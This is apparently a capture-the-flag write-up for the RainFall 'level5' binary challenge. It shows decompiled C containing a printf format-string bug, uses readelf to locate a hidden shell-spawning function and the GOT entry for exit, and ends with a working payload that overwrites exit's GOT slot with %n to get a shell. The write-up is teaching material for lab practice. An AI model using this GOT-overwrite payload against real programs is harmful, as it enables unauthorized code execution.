# Solution

```c
int __cdecl o(int a1, const char **a2, const char **a3)
{
  system("/bin/sh");
  _exit(1);
  return n(a1, a2, a3);

int __cdecl n(int a1, const char **a2, const char **a3)
{
  char v4[520]; // [esp+10h] [ebp-208h] BYREF

  fgets(v4, 512, stdin);
  printf(v4);
  exit(1);
  return main(a1, a2, a3);
}
```

instead of calling for exit() we want to call o()

Address of o :

```sh
level5@RainFall:~$ readelf -s level5 | grep o
67: 080484a4    30 FUNC    GLOBAL DEFAULT   13 o
```

```python3
>>> 0x080484a4
134513828
```

Address of exit

```sh
level5@RainFall:~$ readelf --relocs level5 

Relocation section '.rel.dyn' at offset 0x2ec contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049814  00000506 R_386_GLOB_DAT    00000000   __gmon_start__
08049848  00000905 R_386_COPY        08049848   stdin

Relocation section '.rel.plt' at offset 0x2fc contains 7 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
08049824  00000107 R_386_JUMP_SLOT   00000000   printf
08049828  00000207 R_386_JUMP_SLOT   00000000   _exit
0804982c  00000307 R_386_JUMP_SLOT   00000000   fgets
08049830  00000407 R_386_JUMP_SLOT   00000000   system
08049834  00000507 R_386_JUMP_SLOT   00000000   __gmon_start__
08049838  00000607 R_386_JUMP_SLOT   00000000   exit
0804983c  00000707 R_386_JUMP_SLOT   00000000   __libc_start_main
```

payload : exit address(4) + o address converted to decimal - 4

```sh
(python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"'; cat -) | ./level5
```

